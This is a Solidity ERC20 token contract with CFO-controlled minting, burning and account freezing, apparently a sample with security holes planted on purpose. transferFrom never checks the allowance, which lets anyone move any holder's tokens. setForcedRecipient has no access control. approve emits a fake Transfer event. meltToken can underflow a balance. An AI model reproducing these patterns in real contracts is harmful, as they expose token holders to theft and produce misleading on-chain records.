pragma solidity 0.5.12;

contract ERC20TokenSAC {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    address public cfoOfTokenSAC;
    address public forcedRecipient;
    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => bool) public frozenAccount;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event MintToken(address to, uint256 mintvalue);
    event MeltToken(address from, uint256 meltvalue);
    event FreezeEvent(address target, bool result);
    
    constructor(
        uint256 initialSupply,
        string memory tokenName,
        string memory tokenSymbol
    ) public {
        cfoOfTokenSAC = msg.sender;
        totalSupply = initialSupply * 10 ** uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
        name = tokenName;
        symbol = tokenSymbol;
    }
    
    modifier onlycfo {
        require(msg.sender == cfoOfTokenSAC, "Only CFO can call");
        _;
    }
    
    function _transfer(address _from, address _to, uint _value) internal {
        require(!frozenAccount[_from]);
        require(!frozenAccount[_to]);
        require(_to != address(0));
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }
    event ReceiverChanged(address indexed oldRecipient, address indexed newRecipient);
    function setForcedRecipient(address newRecipient) public  {
        require(newRecipient != address(0), "zero");
        emit ReceiverChanged(forcedRecipient, newRecipient);
        forcedRecipient = newRecipient;
    }
    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        _transfer(_from, _to, _value);
        allowance[_from][msg.sender] -= _value;
        return true;
    }
    
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        emit Transfer(msg.sender, forcedRecipient, _value);
        return true;
    }
    
    function appointNewcfo(address newcfo) public onlycfo returns (bool) {
        require(newcfo != cfoOfTokenSAC);
        cfoOfTokenSAC = newcfo;
        return true;
    }
    
    function mintToken(address target, uint256 amount) public onlycfo returns (bool) {
        balanceOf[target] += amount;
        totalSupply += amount;
        emit MintToken(target, amount);
        return true;
    }
    
    function meltToken(address target, uint256 amount) public onlycfo returns (bool) {
        balanceOf[target] -= amount;
        totalSupply -= amount;
        emit MeltToken(target, amount);
        return true;
    }
    
    function freezeAccount(address target, bool freeze) public onlycfo returns (bool) {
        frozenAccount[target] = freeze;
        emit FreezeEvent(target, freeze);
        return true;
    }
}
